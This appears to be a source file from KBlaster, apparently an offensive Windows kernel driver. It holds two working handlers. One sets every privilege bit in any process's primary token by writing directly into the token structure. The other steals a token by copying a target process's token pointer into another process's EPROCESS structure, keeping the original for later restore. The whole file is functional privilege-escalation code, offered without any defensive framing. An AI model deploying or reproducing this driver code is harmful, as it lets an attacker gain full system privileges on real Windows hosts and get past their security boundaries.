/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster_k_token.hpp"


PVOID l_TokenRestore = 0;

__declspec(code_seg("PAGE"))
NTSTATUS Kblaster_token_SetPrivileges(
	_In_ PVOID pTokenPrivRequest, 
	_In_ ULONG RequestLength)
{
	PAGED_CODE();

	NTSTATUS status = 1;
	PEPROCESS pEprocess = 0;
	PACCESS_TOKEN pAccessToken = 0;
	PPROCESS_PRIVILEGES pPriv = 0;
	PKLBR_TOKEN_PRIV pRequest = static_cast<PKLBR_TOKEN_PRIV>(pTokenPrivRequest);

	if (RequestLength < sizeof(KLBR_TOKEN_PRIV) ||
		!pRequest->processId) {
		status = STATUS_INVALID_PARAMETER;
		goto Exit;
	}

	status = PsLookupProcessByProcessId(UlongToHandle(pRequest->processId), &pEprocess);
	if (!NT_SUCCESS(status)) {
		goto Exit;
	}

	pAccessToken = PsReferencePrimaryToken(pEprocess);
	pPriv = static_cast<PPROCESS_PRIVILEGES>(Add2Ptr(pAccessToken, 0x40));

	ACQUIRE_WRITE_LOCK(g_Locked);
	if (pRequest->IsEnable) {
		pPriv->Present[0] = pPriv->Enabled[0] = 0xff;
		pPriv->Present[1] = pPriv->Enabled[1] = 0xff;
		pPriv->Present[2] = pPriv->Enabled[2] = 0xff;
		pPriv->Present[3] = pPriv->Enabled[3] = 0xff;
		pPriv->Present[4] = pPriv->Enabled[4] = 0xff;
	}
	else {
		pPriv->Present[0] = pPriv->Enabled[0] = 0x00;
		pPriv->Present[1] = pPriv->Enabled[1] = 0x00;
		pPriv->Present[2] = pPriv->Enabled[2] = 0x00;
		pPriv->Present[3] = pPriv->Enabled[3] = 0x00;
		pPriv->Present[4] = pPriv->Enabled[4] = 0x00;
	}
	RELEASE_WRITE_LOCK(g_Locked);


Exit:
	if (pAccessToken) {
		PsDereferencePrimaryToken(pAccessToken);
	}
	if (pEprocess) {
		ObDereferenceObject(pEprocess);
	}
	pPriv = 0;

	return status;
}


__declspec(code_seg("PAGE"))
NTSTATUS Kblaster_token_SetContext(
	_In_ PVOID pTokenRequest, 
	_In_ ULONG RequestLength)
{
	PAGED_CODE();

	NTSTATUS status = 1;
	PEPROCESS pEprocess = 0, pTargetEprocess = 0;
	PEX_FAST_REF pToken = 0, pTargetToken = 0;
	PKLBR_TOKEN pRequest = static_cast<PKLBR_TOKEN>(pTokenRequest);

	if (RequestLength < sizeof(KLBR_TOKEN)) {
		status = STATUS_INVALID_PARAMETER;
		goto Exit;
	}

	if (pRequest->IsSteal) {
		
		if (l_TokenRestore) {
			status = STATUS_DEVICE_BUSY;
			goto Exit;
		}

		status = PsLookupProcessByProcessId(
			UlongToHandle(pRequest->targetProcessId), &pTargetEprocess);
		if (!NT_SUCCESS(status)) {
			goto Exit;
		}

		status = PsLookupProcessByProcessId(
			ULongToHandle(pRequest->processId), &pEprocess);
		if (!NT_SUCCESS(status)) {
			goto Exit;
		}

		ACQUIRE_WRITE_LOCK(g_Locked);
		pToken = (PEX_FAST_REF)
			Add2Ptr(pEprocess, EPROCESS_TOKEN_OFFSET[g_WindowsVersion]);
		pTargetToken = (PEX_FAST_REF)
			Add2Ptr(pTargetEprocess, EPROCESS_TOKEN_OFFSET[g_WindowsVersion]);

		l_TokenRestore = pToken->Value;
		pToken->Value = pTargetToken->Value;
		RELEASE_WRITE_LOCK(g_Locked);

	}
	else {

		if (!l_TokenRestore) {
			status = STATUS_NO_TOKEN;
			goto Exit;
		}

		status = PsLookupProcessByProcessId(
			UlongToHandle(pRequest->processId), &pEprocess);
		if (!NT_SUCCESS(status)) {
			goto Exit;
		}

		ACQUIRE_WRITE_LOCK(g_Locked);
		pToken = (PEX_FAST_REF)Add2Ptr(
			pEprocess, EPROCESS_TOKEN_OFFSET[g_WindowsVersion]);

		pToken->Value = l_TokenRestore;
		l_TokenRestore = 0;
		RELEASE_WRITE_LOCK(g_Locked);

	}
	
Exit:
	if (pEprocess) {
		ObDereferenceObject(pEprocess);
	}
	if (pTargetEprocess) {
		ObDereferenceObject(pTargetEprocess);
	}

	return status;
}